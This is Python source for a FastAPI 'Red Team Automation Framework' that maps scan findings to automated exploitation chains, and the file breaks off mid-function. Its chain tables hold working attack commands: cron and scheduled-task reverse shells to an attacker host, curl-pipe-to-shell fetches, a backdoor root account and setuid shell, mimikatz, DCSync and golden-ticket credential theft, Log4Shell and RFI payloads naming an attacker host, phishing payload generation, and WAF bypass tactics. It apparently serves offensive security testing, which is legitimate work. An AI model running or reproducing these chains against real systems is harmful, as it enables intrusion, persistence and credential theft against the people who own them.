from fastapi import FastAPI, APIRouter, HTTPException, BackgroundTasks, WebSocket, WebSocketDisconnect
from fastapi.responses import StreamingResponse
from starlette.middleware.cors import CORSMiddleware
import os
import logging
from pathlib import Path
from pydantic import BaseModel
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone
import subprocess
import httpx
import json
import re
import io
import asyncio
import time
from fpdf import FPDF

# Local modules — SQLite-based persistence
from config import config
import db as repo
import jobs

app = FastAPI(title="Red Team Automation Framework")
api_router = APIRouter(prefix="/api")

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# In-memory state for real-time tracking during active operations
scan_progress: Dict[str, Dict[str, Any]] = {}
attack_trees: Dict[str, Dict[str, Any]] = {}
active_connections: Dict[str, List[WebSocket]] = {}
active_chains: Dict[str, Dict[str, Any]] = {}

# Config values from config.py
KIMI_API_KEY = config.kimi_api_key
KIMI_API_URL = "https://api.moonshot.ai/v1/chat/completions"
MSF_RPC_TOKEN = config.msf_rpc_token
MSF_RPC_HOST = config.msf_rpc_host
MSF_RPC_PORT = config.msf_rpc_port
SLIVER_CONFIG_PATH = config.sliver_config_path


# =============================================================================
# ATTACK CHAINS - AUTOMATED EXPLOITATION SEQUENCES
# =============================================================================
class AttackChainEngine:
    ATTACK_CHAINS = {
        "web_to_shell": {
            "name": "Web App to Shell",
            "description": "SQLi/RCE -> Credential Dump -> Persistence",
            "trigger": ["sql injection", "rce", "command injection"],
            "steps": [
                {"id": 1, "name": "Initial Exploitation", "actions": [
                    {"tool": "sqlmap", "cmd": "sqlmap -u '{url}' --os-shell --batch", "condition": "sqli"},
                    {"tool": "commix", "cmd": "commix -u '{url}' --os-cmd='id'", "condition": "cmdi"}
                ]},
                {"id": 2, "name": "Credential Harvesting", "actions": [
                    {"tool": "sqlmap", "cmd": "sqlmap -u '{url}' --passwords --batch", "condition": "sqli"},
                    {"cmd": "cat /etc/passwd; cat /etc/shadow 2>/dev/null", "condition": "shell"}
                ]},
                {"id": 3, "name": "Privilege Escalation Check", "actions": [
                    {"tool": "linpeas", "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", "condition": "linux"},
                    {"tool": "winpeas", "cmd": "winPEASx64.exe", "condition": "windows"}
                ]},
                {"id": 4, "name": "Establish Persistence", "actions": [
                    {"cmd": "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"' | crontab -", "condition": "linux"},
                    {"cmd": "schtasks /create /tn 'Update' /tr 'powershell -ep bypass -c IEX((New-Object Net.WebClient).DownloadString(\"http://{lhost}:{lport}/shell.ps1\"))' /sc minute", "condition": "windows"}
                ]}
            ]
        },
        "smb_to_domain": {
            "name": "SMB to Domain Admin",
            "description": "EternalBlue/Creds -> Hashdump -> Lateral -> DC",
            "trigger": ["smb", "445", "ms17-010"],
            "steps": [
                {"id": 1, "name": "SMB Exploitation", "actions": [
                    {"tool": "metasploit", "module": "exploit/windows/smb/ms17_010_eternalblue", "condition": "ms17-010"},
                    {"tool": "crackmapexec", "cmd": "crackmapexec smb {target} -u '' -p ''", "condition": "smb"}
                ]},
                {"id": 2, "name": "Credential Dump", "actions": [
                    {"tool": "mimikatz", "cmd": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit"},
                    {"tool": "secretsdump", "cmd": "secretsdump.py {domain}/{user}:{pass}@{target}"}
                ]},
                {"id": 3, "name": "Lateral Movement", "actions": [
                    {"tool": "psexec", "cmd": "psexec.py {domain}/{user}:{pass}@{next_target}"},
                    {"tool": "wmiexec", "cmd": "wmiexec.py {domain}/{user}:{pass}@{next_target}"},
                    {"tool": "crackmapexec", "cmd": "crackmapexec smb {subnet} -u {user} -p {pass} --sam"}
                ]},
                {"id": 4, "name": "Domain Controller Compromise", "actions": [
                    {"tool": "secretsdump", "cmd": "secretsdump.py {domain}/{admin}:{pass}@{dc} -just-dc"},
                    {"tool": "mimikatz", "cmd": "lsadump::dcsync /domain:{domain} /user:Administrator"}
                ]}
            ]
        },
        "kerberos_attack": {
            "name": "Kerberos Attack Chain",
            "description": "User Enum -> AS-REP -> Kerberoast -> Golden Ticket",
            "trigger": ["kerberos", "88", "active directory"],
            "steps": [
                {"id": 1, "name": "User Enumeration", "actions": [
                    {"tool": "kerbrute", "cmd": "kerbrute userenum -d {domain} users.txt --dc {dc}"},
                    {"tool": "crackmapexec", "cmd": "crackmapexec ldap {dc} -u '' -p '' --users"}
                ]},
                {"id": 2, "name": "AS-REP Roasting", "actions": [
                    {"tool": "impacket", "cmd": "GetNPUsers.py {domain}/ -usersfile users.txt -no-pass -dc-ip {dc}"},
                    {"tool": "rubeus", "cmd": "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt"}
                ]},
                {"id": 3, "name": "Kerberoasting", "actions": [
                    {"tool": "impacket", "cmd": "GetUserSPNs.py {domain}/{user}:{pass} -dc-ip {dc} -request"},
                    {"tool": "rubeus", "cmd": "Rubeus.exe kerberoast /outfile:kerberoast.txt"}
                ]},
                {"id": 4, "name": "Crack Hashes", "actions": [
                    {"tool": "hashcat", "cmd": "hashcat -m 18200 asrep.txt wordlist.txt"},
                    {"tool": "hashcat", "cmd": "hashcat -m 13100 kerberoast.txt wordlist.txt"}
                ]},
                {"id": 5, "name": "Golden Ticket", "actions": [
                    {"tool": "mimikatz", "cmd": "kerberos::golden /user:Administrator /domain:{domain} /sid:{sid} /krbtgt:{hash} /ptt"},
                    {"tool": "impacket", "cmd": "ticketer.py -nthash {krbtgt_hash} -domain-sid {sid} -domain {domain} Administrator"}
                ]}
            ]
        },
        "linux_privesc": {
            "name": "Linux Privilege Escalation",
            "description": "Shell -> Enum -> Exploit -> Root",
            "trigger": ["linux", "shell", "ssh"],
            "steps": [
                {"id": 1, "name": "System Enumeration", "actions": [
                    {"cmd": "uname -a; cat /etc/*release*"},
                    {"cmd": "id; sudo -l 2>/dev/null"},
                    {"tool": "linpeas", "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"}
                ]},
                {"id": 2, "name": "SUID/Capabilities Check", "actions": [
                    {"cmd": "find / -perm -4000 -type f 2>/dev/null"},
                    {"cmd": "getcap -r / 2>/dev/null"}
                ]},
                {"id": 3, "name": "Kernel Exploit", "actions": [
                    {"tool": "linux-exploit-suggester", "cmd": "./linux-exploit-suggester.sh"},
                    {"tool": "metasploit", "module": "exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec", "condition": "polkit"},
                    {"tool": "metasploit", "module": "exploit/linux/local/cve_2022_0847_dirtypipe", "condition": "kernel>=5.8"}
                ]},
                {"id": 4, "name": "Root Persistence", "actions": [
                    {"cmd": "echo 'hacker:$6$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd"},
                    {"cmd": "cp /bin/bash /tmp/.backdoor; chmod +s /tmp/.backdoor"}
                ]}
            ]
        },
        "windows_privesc": {
            "name": "Windows Privilege Escalation",
            "description": "Shell -> Enum -> Exploit -> SYSTEM",
            "trigger": ["windows", "shell", "rdp", "winrm"],
            "steps": [
                {"id": 1, "name": "System Enumeration", "actions": [
                    {"cmd": "systeminfo"}, {"cmd": "whoami /priv"},
                    {"tool": "winpeas", "cmd": "winPEASx64.exe"}
                ]},
                {"id": 2, "name": "Service/Scheduled Task Abuse", "actions": [
                    {"cmd": "sc qc vulnerable_service"},
                    {"tool": "powerup", "cmd": "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\""}
                ]},
                {"id": 3, "name": "Token Impersonation", "actions": [
                    {"tool": "incognito", "cmd": "incognito.exe list_tokens -u"},
                    {"tool": "metasploit", "module": "post/windows/manage/migrate"}
                ]},
                {"id": 4, "name": "Credential Extraction", "actions": [
                    {"tool": "mimikatz", "cmd": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit"},
                    {"tool": "metasploit", "module": "post/windows/gather/hashdump"}
                ]}
            ]
        },
        "phishing_to_shell": {
            "name": "Phishing to Internal Access",
            "description": "Phish -> Macro -> Beacon -> Pivot",
            "trigger": ["phishing", "email", "social"],
            "steps": [
                {"id": 1, "name": "Payload Generation", "actions": [
                    {"tool": "msfvenom", "cmd": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={lhost} LPORT=443 -f exe > payload.exe"},
                    {"tool": "macro_pack", "cmd": "echo 'payload' | macro_pack.py -t DROPPER -o mal.docm"}
                ]},
                {"id": 2, "name": "Delivery", "actions": [
                    {"tool": "gophish", "cmd": "Launch phishing campaign with mal.docm attachment"},
                    {"tool": "evilginx2", "cmd": "Setup credential harvesting proxy"}
                ]},
                {"id": 3, "name": "Initial Beacon", "actions": [
                    {"tool": "metasploit", "cmd": "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https"},
                    {"cmd": "Wait for callback from victim"}
                ]},
                {"id": 4, "name": "Internal Recon & Pivot", "actions": [
                    {"cmd": "arp -a; netstat -an; ipconfig /all"},
                    {"tool": "chisel", "cmd": "chisel server -p 8080 --reverse (on attack box: {lhost})"},
                    {"cmd": "chisel client {lhost}:8080 R:socks"}
                ]}
            ]
        }
    }

    @classmethod
    def get_applicable_chains(cls, findings: Dict) -> List[Dict]:
        applicable = []
        findings_text = json.dumps(findings).lower()
        for chain_id, chain in cls.ATTACK_CHAINS.items():
            for trigger in chain["trigger"]:
                if trigger.lower() in findings_text:
                    applicable.append({
                        "id": chain_id, "name": chain["name"],
                        "description": chain["description"], "trigger_matched": trigger,
                        "steps": chain["steps"], "total_steps": len(chain["steps"])
                    })
                    break
        return applicable

    @classmethod
    def get_chain_details(cls, chain_id: str) -> Optional[Dict]:
        return cls.ATTACK_CHAINS.get(chain_id)

    @classmethod
    def generate_chain_commands(cls, chain_id: str, context: Dict) -> List[Dict]:
        chain = cls.ATTACK_CHAINS.get(chain_id)
        if not chain:
            return []
        commands = []
        for step in chain["steps"]:
            step_commands = []
            for action in step["actions"]:
                cmd = action.get("cmd", "")
                for key, value in context.items():
                    cmd = cmd.replace(f"{{{key}}}", str(value))
                step_commands.append({
                    "tool": action.get("tool", "shell"), "command": cmd,
                    "module": action.get("module"), "condition": action.get("condition")
                })
            commands.append({"step_id": step["id"], "step_name": step["name"], "commands": step_commands})
        return commands


# =============================================================================
# TACTICAL DECISION ENGINE
# =============================================================================
class TacticalDecisionEngine:
    WAF_BYPASS_STRATEGIES = {
        "cloudflare": {
            "name": "Cloudflare",
            "techniques": [
                {"id": "T1090", "name": "Origin IP Discovery", "tools": ["censys", "shodan", "securitytrails"], "cmd": "Use historical DNS records, SSL certificates to find origin IP"},
                {"id": "T1027", "name": "Payload Encoding", "tools": ["wafw00f", "sqlmap"], "cmd": "sqlmap --tamper=charencode,space2comment"},
                {"id": "T1071", "name": "Protocol Abuse", "tools": ["curl"], "cmd": "Try HTTP/2, WebSocket connections"},
            ],
            "bypass_headers": ["CF-Connecting-IP", "X-Forwarded-For", "X-Real-IP"],
            "alternative_approach": "Find origin IP via email headers, DNS history, or subdomains not behind CF"
        },
        "akamai": {
            "name": "Akamai",
            "techniques": [
                {"id": "T1090", "name": "Edge Bypass", "tools": ["subfinder", "amass"], "cmd": "Find non-Akamai subdomains"},
                {"id": "T1027", "name": "Request Smuggling", "tools": ["smuggler"], "cmd": "HTTP request smuggling attacks"},
            ],
            "alternative_approach": "Look for staging/dev environments not protected by Akamai"
        },
        "aws_waf": {
            "name": "AWS WAF",
            "techniques": [
                {"id": "T1027", "name": "Unicode Normalization", "tools": ["burp"], "cmd": "Use Unicode encoding to bypass rules"},
                {"id": "T1090", "name": "Regional Bypass", "tools": ["vpn"], "cmd": "Try from different AWS regions"},
            ],
            "alternative_approach": "Check for S3 buckets, Lambda endpoints without WAF"
        },
        "imperva": {
            "name": "Imperva/Incapsula",
            "techniques": [
                {"id": "T1090", "name": "Origin Discovery", "tools": ["dig", "nslookup"], "cmd": "Check MX records, SPF for origin"},
                {"id": "T1027", "name": "Payload Fragmentation", "tools": ["sqlmap"], "cmd": "Use chunked encoding"},
            ],
            "alternative_approach": "Historical DNS, Wayback Machine for old IPs"
        },
        "modsecurity": {
            "name": "ModSecurity",
            "techniques": [
                {"id": "T1027", "name": "Rule Bypass", "tools": ["sqlmap"], "cmd": "sqlmap --tamper=between,randomcase"},
                {"id": "T1190", "name": "Anomaly Score Gaming", "tools": ["burp"], "cmd": "Split payload across multiple requests"},
            ],
            "alternative_approach": "Identify paranoia level and craft payloads below threshold"
        },
        "default": {
            "name": "Generic WAF",
            "techniques": [
                {"id": "T1027", "name": "Encoding Bypass", "tools": ["burp", "sqlmap"], "cmd": "Try URL, Unicode, Base64 encoding"},
                {"id": "T1090", "name": "Origin Discovery", "tools": ["censys", "shodan"], "cmd": "Search for exposed origin servers"},
                {"id": "T1071", "name": "Protocol Switch", "tools": ["curl"], "cmd": "Try HTTPS, HTTP/2, gRPC if available"},
            ],
            "alternative_approach": "Enumerate all subdomains, find unprotected endpoints"
        }
    }

    SERVICE_ATTACK_MAP = {
        "ssh": {"22/tcp": ["hydra", "crackmapexec"], "exploits": ["auxiliary/scanner/ssh/ssh_login", "exploit/linux/ssh/sshexec"], "next_phase": "credential_access", "decision": "SSH detected - attempt credential brute force or key-based auth"},
        "http": {"80/tcp": ["nikto", "gobuster", "sqlmap"], "443/tcp": ["nikto", "gobuster", "sqlmap", "sslscan"], "exploits": ["exploit/multi/http/apache_mod_cgi_bash_env_exec", "auxiliary/scanner/http/dir_scanner"], "next_phase": "initial_access", "decision": "Web server detected - enumerate directories, check for vulns"},
        "smb": {"445/tcp": ["crackmapexec", "enum4linux"], "139/tcp": ["crackmapexec", "enum4linux"], "exploits": ["exploit/windows/smb/ms17_010_eternalblue", "auxiliary/scanner/smb/smb_ms17_010"], "next_phase": "initial_access", "decision": "SMB detected - check for EternalBlue, null sessions"},
        "rdp": {"3389/tcp": ["hydra", "ncrack"], "exploits": ["auxiliary/scanner/rdp/rdp_scanner", "exploit/windows/rdp/cve_2019_0708_bluekeep_rce"], "next_phase": "initial_access", "decision": "RDP detected - check BlueKeep, attempt credential attack"},
        "mysql": {"3306/tcp": ["hydra", "mysql"], "exploits": ["auxiliary/scanner/mysql/mysql_login"], "next_phase": "credential_access", "decision": "MySQL detected - attempt default creds, check for UDF exploitation"},
        "mssql": {"1433/tcp": ["crackmapexec", "mssqlclient"], "exploits": ["auxiliary/scanner/mssql/mssql_login", "exploit/windows/mssql/mssql_payload"], "next_phase": "credential_access", "decision": "MSSQL detected - xp_cmdshell potential, credential spray"},
        "ftp": {"21/tcp": ["hydra", "nmap"], "exploits": ["auxiliary/scanner/ftp/anonymous", "exploit/unix/ftp/vsftpd_234_backdoor"], "next_phase": "initial_access", "decision": "FTP detected - check anonymous access, version exploits"},
        "ldap": {"389/tcp": ["ldapsearch", "windapsearch"], "636/tcp": ["ldapsearch"], "exploits": ["auxiliary/gather/ldap_query"], "next_phase": "discovery", "decision": "LDAP detected - enumerate AD, check for null bind"},
        "winrm": {"5985/tcp": ["evil-winrm", "crackmapexec"], "5986/tcp": ["evil-winrm"], "exploits": ["auxiliary/scanner/winrm/winrm_login"], "next_phase": "lateral_movement", "decision": "WinRM detected - potential for lateral movement with creds"},
        "kerberos": {"88/tcp": ["kerbrute", "impacket"], "exploits": ["auxiliary/gather/kerberos_enumusers"], "next_phase": "credential_access", "decision": "Kerberos detected - AS-REP roasting, Kerberoasting possible"},
    }

    VULN_EXPLOIT_MAP = {
        "sql injection": {"tools": ["sqlmap"], "cmd": "sqlmap -u '{url}' --dbs --batch --random-agent", "exploits": [], "severity": "critical", "next_action": "Dump database, look for credentials"},
        "xss": {"tools": ["xsser", "dalfox"], "cmd": "dalfox url '{url}' --blind your-server.com", "exploits": [], "severity": "high", "next_action": "Attempt session hijacking, phishing"},
        "lfi": {"tools": ["burp", "curl"], "cmd": "curl '{url}?file=../../../etc/passwd'", "exploits": ["exploit/unix/webapp/php_include"], "severity": "critical", "next_action": "Read /etc/passwd, attempt RCE via log poisoning"},
        "rfi": {"tools": ["curl"], "cmd": "curl '{url}?file=http://attacker/shell.php'", "exploits": ["exploit/unix/webapp/php_include"], "severity": "critical", "next_action": "Host malicious PHP, get shell"},
        "command injection": {"tools": ["commix", "burp"], "cmd": "commix -u '{url}' --batch", "exploits": [], "severity": "critical", "next_action": "Get reverse shell immediately"},
        "ssrf": {"tools": ["burp", "ssrfmap"], "cmd": "Try internal IPs: 127.0.0.1, 169.254.169.254 (AWS metadata)", "exploits": [], "severity": "high", "next_action": "Access internal services, cloud metadata"},
        "shellshock": {"tools": ["curl", "metasploit"], "cmd": "curl -A '() {{ :;}}; /bin/bash -c \"id\"' {url}", "exploits": ["exploit/multi/http/apache_mod_cgi_bash_env_exec"], "severity": "critical", "next_action": "Immediate RCE possible"},
        "log4shell": {"tools": ["log4j-scan", "metasploit"], "cmd": "${{jndi:ldap://attacker:1389/a}}", "exploits": ["exploit/multi/http/log4shell_header_injection"], "severity": "critical", "next_action": "Deploy JNDI callback server, get shell"},
        "eternalblue": {"tools": ["metasploit"], "cmd": "use exploit/windows/smb/ms17_010_eternalblue", "exploits": ["exploit/windows/smb/ms17_010_eternalblue"], "severity": "critical", "next_action": "Direct RCE, SYSTEM shell"},
    }

    @classmethod
    def analyze_waf_detection(cls, waf_result: Dict) -> Dict[str, Any]:
        waf_name = waf_result.get("waf", "").lower() if waf_result.get("waf") else None
        if not waf_name or waf_name == "none detected":
            return {"waf_detected": False, "decision": "No WAF detected - proceed with standard attack methodology", "strategy": None, "risk_level": "low"}
        strategy = None
        for key, strat in cls.WAF_BYPASS_STRATEGIES.items():
            if key in waf_name.lower():
                strategy = strat
                break
        if not strategy:
            strategy = cls.WAF_BYPASS_STRATEGIES["default"]
        return {
            "waf_detected": True, "waf_name": waf_name,
            "decision": f"WAF DETECTED: {waf_name} - Adapting attack strategy",
            "strategy": strategy, "bypass_techniques": strategy["techniques"],
            "alternative_approach": strategy["alternative_approach"],
            "risk_level": "high", "recommendation": "Consider origin IP discovery before direct attacks"
        }

    @classmethod
    def analyze_ports(cls, nmap_result: Dict) -> List[Dict[str, Any]]:
        decisions = []
        for port_info in nmap_result.get("ports", []):
            port = port_info.get("port", "")
            service = port_info.get("service", "").lower()
            if port_info.get("state") != "open":
                continue
            for svc_name, svc_strategy in cls.SERVICE_ATTACK_MAP.items():
                if svc_name in service or port in svc_strategy:
                    decisions.append({
                        "port": port, "service": service, "attack_strategy": svc_strategy,
                        "decision": svc_strategy["decision"],
                        "recommended_tools": svc_strategy.get(port, svc_strategy.get(list(svc_strategy.keys())[0])),
                        "exploits": svc_strategy["exploits"], "next_phase": svc_strategy["next_phase"]
                    })
                    break
        return decisions

    @classmethod
    def analyze_vulnerabilities(cls, vuln_results: Dict) -> List[Dict[str, Any]]:
        decisions = []
        for vuln in vuln_results.get("vulnerabilities", []):
            vuln_text = vuln.get("finding", str(vuln)).lower() if isinstance(vuln, dict) else str(vuln).lower()
            for vuln_type, vuln_strategy in cls.VULN_EXPLOIT_MAP.items():
                if vuln_type in vuln_text:
                    decisions.append({
                        "vulnerability": vuln_type, "finding": vuln_text[:100],
                        "severity": vuln_strategy["severity"], "tools": vuln_strategy["tools"],
                        "command": vuln_strategy["cmd"], "exploits": vuln_strategy["exploits"],
                        "next_action": vuln_strategy["next_action"]
                    })
                    break
        return decisions

    @classmethod
    async def get_tactical_advice(cls, results: Dict, target: str, vault_context: Dict = None) -> Dict[str, Any]:
        advice = {
            "timestamp": datetime.now(timezone.utc).isoformat(), "target": target,
            "waf_analysis": None, "port_decisions": [], "vuln_decisions": [],
            "kill_chain_update": [], "priority_actions": [], "overall_strategy": "",
            "next_best_action": None, "trigger_chain": None, "skip_tools": [], "add_tools": []
        }
        has_waf = False
        if "wafw00f" in results or "waf" in results:
            waf_result = results.get("wafw00f", results.get("waf", {}))
            advice["waf_analysis"] = cls.analyze_waf_detection(waf_result)
            if advice["waf_analysis"]["waf_detected"]:
                has_waf = True
                advice["priority_actions"].append({"priority": 1, "action": "WAF Bypass Required", "details": advice["waf_analysis"]["alternative_approach"]})
                advice["skip_tools"] = ["nikto", "sqlmap", "gobuster"]
                advice["add_tools"] = ["subfinder"]
        if "nmap" in results:
            advice["port_decisions"] = cls.analyze_ports(results["nmap"])
            for decision in advice["port_decisions"]:
                svc = decision["service"]
                if "smb" in svc or "445" in decision.get("port", ""):
                    advice["add_tools"].extend(["crackmapexec"])
                    advice["priority_actions"].append({"priority": 1, "action": f"High-value: {svc} on {decision['port']}", "details": decision["decision"], "type": "exploit", "tool": "crackmapexec", "exploit": decision["exploits"][0] if decision["exploits"] else None, "port": decision["port"]})
                elif "rdp" in svc or "3389" in decision.get("port", ""):
                    advice["priority_actions"].append({"priority": 2, "action": f"RDP on {decision['port']}", "details": decision["decision"], "type": "exploit", "exploit": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce", "port": decision["port"]})
                elif "ssh" in svc:
                    advice["add_tools"].extend(["hydra"])
                elif ("http" in svc or "80" in decision.get("port", "")) and not has_waf:
                    advice["add_tools"].extend(["nikto", "gobuster"])
        if "nikto" in results:
            advice["vuln_decisions"] = cls.analyze_vulnerabilities(results["nikto"])
            for vuln in advice["vuln_decisions"]:
                if vuln["severity"] == "critical":
                    advice["priority_actions"].append({"priority": 1, "action": f"CRITICAL: {vuln['vulnerability']}", "details": vuln["next_action"], "type": "vuln_exploit", "tool": vuln["tools"][0] if vuln["tools"] else None, "exploit": vuln["exploits"][0] if vuln["exploits"] else None, "command": vuln["command"]})
        advice["priority_actions"].sort(key=lambda x: x["priority"])
        vault = vault_context or {}
        has_session = bool(vault.get("sessions"))
        has_creds = bool(vault.get("credentials"))
        if advice["priority_actions"]:
            top_action = advice["priority_actions"][0]
            if top_action.get("type") == "vuln_exploit" and top_action.get("exploit") and not has_session:
                advice["next_best_action"] = {"action": "run_exploit", "module": top_action["exploit"], "target": target, "reason": f"Critical vulnerability: {top_action['action']}"}
            elif top_action.get("type") == "exploit" and top_action.get("exploit") and not has_session:
                advice["next_best_action"] = {"action": "run_exploit", "module": top_action["exploit"], "target": target, "port": top_action.get("port"), "reason": top_action["action"]}
            elif top_action.get("tool"):
                advice["next_best_action"] = {"action": "run_tool", "tool": top_action["tool"], "target": target, "reason": top_action["action"]}
        if has_session and not has_creds:
            advice["next_best_action"] = {"action": "post_exploit", "module": "post/windows/gather/hashdump" if vault.get("os_info", {}).get("os") == "windows" else None, "reason": "Session active - harvest credentials"}
        results_text = json.dumps(results).lower()
        chain_triggers = {
            "web_to_shell": ["sql injection", "command injection", "rce", "file upload"],
            "smb_to_domain": ["445/tcp", "ms17-010", "eternalblue", "smb"],
            "kerberos_attack": ["88/tcp", "kerberos", "active directory"],
            "linux_privesc": ["shell", "ssh"],
            "windows_privesc": ["rdp", "winrm", "smb"],
        }
        for chain_id, triggers in chain_triggers.items():
            match_count = sum(1 for t in triggers if t in results_text)
            if match_count >= 2 and not has_session:
                matched = [t for t in triggers if t in results_text]
                advice["trigger_chain"] = {"chain_id": chain_id, "triggers_matched": matched, "confidence": min(match_count / len(triggers), 1.0), "reason": f"Multiple indicators match: {', '.join(matched)}"}
                break
        if has_waf:
            advice["overall_strategy"] = f"WAF detected ({advice['waf_analysis']['waf_name']}). Indirect approach: skip aggressive tools, find origin IP."
        elif has_session:
            advice["overall_strategy"] = "Session active - focus on post-exploitation and lateral movement."
        elif advice["priority_actions"]:
            advice["overall_strategy"] = f"Direct attack viable. Priority: {advice['priority_actions'][0]['action']}"
        else:
            advice["overall_strategy"] = "Continue reconnaissance. No immediate high-value targets."
        return advice


# =============================================================================
# MITRE ATT&CK TACTICS & RED TEAM TOOLS
# =============================================================================
MITRE_TACTICS = {
    "reconnaissance": {"id": "TA0043", "name": "Reconnaissance", "description": "Gathering information", "techniques": [{"id": "T1595", "name": "Active Scanning", "tools": ["nmap", "masscan"]}, {"id": "T1592", "name": "Gather Victim Host Info", "tools": ["whatweb"]}, {"id": "T1590", "name": "Gather Victim Network Info", "tools": ["subfinder", "amass"]}]},
    "resource_development": {"id": "TA0042", "name": "Resource Development", "description": "Establishing resources", "techniques": [{"id": "T1587", "name": "Develop Capabilities", "tools": ["msfvenom"]}]},
    "initial_access": {"id": "TA0001", "name": "Initial Access", "description": "Gaining foothold", "techniques": [{"id": "T1190", "name": "Exploit Public-Facing App", "tools": ["nikto", "sqlmap"]}, {"id": "T1133", "name": "External Remote Services", "tools": ["hydra"]}]},
    "execution": {"id": "TA0002", "name": "Execution", "description": "Running code", "techniques": []},
    "persistence": {"id": "TA0003", "name": "Persistence", "description": "Maintaining access", "techniques": []},
    "privilege_escalation": {"id": "TA0004", "name": "Privilege Escalation", "description": "Higher permissions", "techniques": []},
    "defense_evasion": {"id": "TA0005", "name": "Defense Evasion", "description": "Avoiding detection", "techniques": []},
    "credential_access": {"id": "TA0006", "name": "Credential Access", "description": "Stealing creds", "techniques": []},
    "discovery": {"id": "TA0007", "name": "Discovery", "description": "Understanding environment", "techniques": []},
    "lateral_movement": {"id": "TA0008", "name": "Lateral Movement", "description": "Moving through env", "techniques": []},
    "collection": {"id": "TA0009", "name": "Collection", "description": "Gathering data", "techniques": []},
    "command_and_control": {"id": "TA0011", "name": "Command and Control", "description": "C2 comms", "techniques": []},
    "exfiltration": {"id": "TA0010", "name": "Exfiltration", "description": "Stealing data", "techniques": []},
    "impact": {"id": "TA0040", "name": "Impact", "description": "Disrupt/destroy", "techniques": []},
}

RED_TEAM_TOOLS = {
    "nmap": {"phase": "reconnaissance", "mitre": "T1595", "cmd": "nmap -sV -sC -A {target}", "desc": "Port scanner"},
    "masscan": {"phase": "reconnaissance", "mitre": "T1595", "cmd": "masscan -p1-65535 {target} --rate=1000", "desc": "Fast scanner"},
    "subfinder": {"phase": "reconnaissance", "mitre": "T1590", "cmd": "subfinder -d {target}", "desc": "Subdomain finder"},
    "wafw00f": {"phase": "reconnaissance", "mitre": "T1592", "cmd": "wafw00f {target}", "desc": "WAF detector"},
    "whatweb": {"phase": "reconnaissance", "mitre": "T1592", "cmd": "whatweb {target}", "desc": "Web fingerprint"},
    "gobuster": {"phase": "reconnaissance", "mitre": "T1594", "cmd": "gobuster dir -u {target} -w wordlist.txt", "desc": "Dir bruteforce"},
    "nikto": {"phase": "initial_access", "mitre": "T1190", "cmd": "nikto -h {target}", "desc": "Web vuln scanner"},
    "sqlmap": {"phase": "initial_access", "mitre": "T1190", "cmd": "sqlmap -u '{target}' --batch", "desc": "SQL injection"},
    "hydra": {"phase": "initial_access", "mitre": "T1110", "cmd": "hydra -L users.txt -P pass.txt {target} ssh", "desc": "Brute force"},
    "crackmapexec": {"phase": "initial_access", "mitre": "T1078", "cmd": "crackmapexec smb {target}", "desc": "SMB/AD pentesting"},
}

METASPLOIT_MODULES = [
    {"name": "exploit/multi/http/apache_mod_cgi_bash_env_exec", "desc": "Shellshock", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
    {"name": "exploit/multi/http/log4shell_header_injection", "desc": "Log4Shell", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
    {"name": "exploit/windows/smb/ms17_010_eternalblue", "desc": "EternalBlue", "rank": "excellent", "category": "exploit", "mitre": "T1210"},
    {"name": "exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec", "desc": "PwnKit", "rank": "excellent", "category": "exploit", "mitre": "T1068"},
    {"name": "exploit/linux/local/cve_2022_0847_dirtypipe", "desc": "Dirty Pipe", "rank": "excellent", "category": "exploit", "mitre": "T1068"},
    {"name": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce", "desc": "BlueKeep", "rank": "manual", "category": "exploit", "mitre": "T1210"},
    {"name": "auxiliary/scanner/smb/smb_ms17_010", "desc": "EternalBlue Scanner", "rank": "normal", "category": "auxiliary", "mitre": "T1595"},
    {"name": "auxiliary/scanner/ssh/ssh_login", "desc": "SSH Brute Force", "rank": "normal", "category": "auxiliary", "mitre": "T1110"},
    {"name": "auxiliary/scanner/http/dir_scanner", "desc": "Dir Scanner", "rank": "normal", "category": "auxiliary", "mitre": "T1594"},
    {"name": "post/windows/gather/hashdump", "desc": "Hash Dump", "rank": "normal", "category": "post", "mitre": "T1003"},
    {"name": "post/multi/recon/local_exploit_suggester", "desc": "Exploit Suggester", "rank": "normal", "category": "post", "mitre": "T1068"},
]


# =============================================================================
# MODELS
# =============================================================================
class ScanCreate(BaseModel):
    target: str
    scan_phases: List[str] = ["reconnaissance", "initial_access"]
    tools: List[str] = []

class ExploitExecute(BaseModel):
    scan_id: str
    node_id: str
    module: str
    target_host: str
    target_port: Optional[int] = None
    options: Dict[str, str] = {}
    lhost: Optional[str] = None
    lport: Optional[int] = 4444

class UpdateNodeStatus(BaseModel):
    status: str
    notes: Optional[str] = None

class ChainExecutionRequest(BaseModel):
    scan_id: str
    chain_id: str
    target: str
    context: Dict[str, str] = {}
    auto_execute: bool = False


# =============================================================================
# HELPER FUNCTIONS
# =============================================================================
def parse_nmap_output(output: str) -> Dict[str, Any]:
    ports = []
    for line in output.split('\n'):
        if '/tcp' in line or '/udp' in line:
            parts = line.split()
            if len(parts) >= 3:
                ports.append({"port": parts[0], "state": parts[1], "service": parts[2]})
    return {"ports": ports, "raw": output}

def parse_waf_output(output: str) -> Dict[str, Any]:
    waf = None
    if "is behind" in output.lower():
        match = re.search(r'is behind (.+?)(?:\n|$)', output, re.IGNORECASE)
        if match:
            waf = match.group(1).strip()
    elif "no waf" in output.lower():
        waf = "None Detected"
    return {"waf": waf, "raw": output}

def parse_nikto_output(output: str) -> Dict[str, Any]:
    vulns = []
    for line in output.split('\n'):
        if line.strip().startswith('+'):
            severity = "medium"
